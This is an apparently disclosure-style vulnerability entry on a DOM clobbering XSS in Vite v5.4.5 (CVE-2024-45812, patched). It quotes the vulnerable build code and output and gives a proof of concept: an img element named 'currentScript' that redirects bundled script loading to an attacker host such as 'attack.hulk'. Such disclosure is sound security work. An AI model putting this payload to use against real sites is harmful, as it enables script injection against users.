## Vite

### Meta

+ Library: Vite
+ Version: v5.4.5
+ Stars: 67.2K
+ Payload: ```<img src="https://attack.hulk" name="currentScript">```
+ Impact: XSS
+ CVE: [CVE-2024-45812](https://nvd.nist.gov/vuln/detail/CVE-2024-45812)
+ Status: Patched
+ Foundby: TheHulk

### Library

https://github.com/vitejs/vite

### Vulnerable Code Snippet

```js
// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1309
const relativeUrlMechanisms = {
  amd: (relativePath) => {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
```

```sh
npm install -D vite
node ./node_modules/vite/bin/vite.js build
```

Output:
```js
"use strict";const t=""+(typeof document>"u"?require("url").pathToFileURL(__dirname+"/extra-Cjq7Wz0N.js").href:new URL("extra-Cjq7Wz0N.js",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
```

## PoC

as an example, bundle the js below: `node ./node_modules/vite/bin/vite.js build`.

```js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
```

example html:


```html
<!--Library-->
<script type="module" crossorigin src="index-DDmIg9VD.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="//localhost:9999">
<!--Payload-->
```

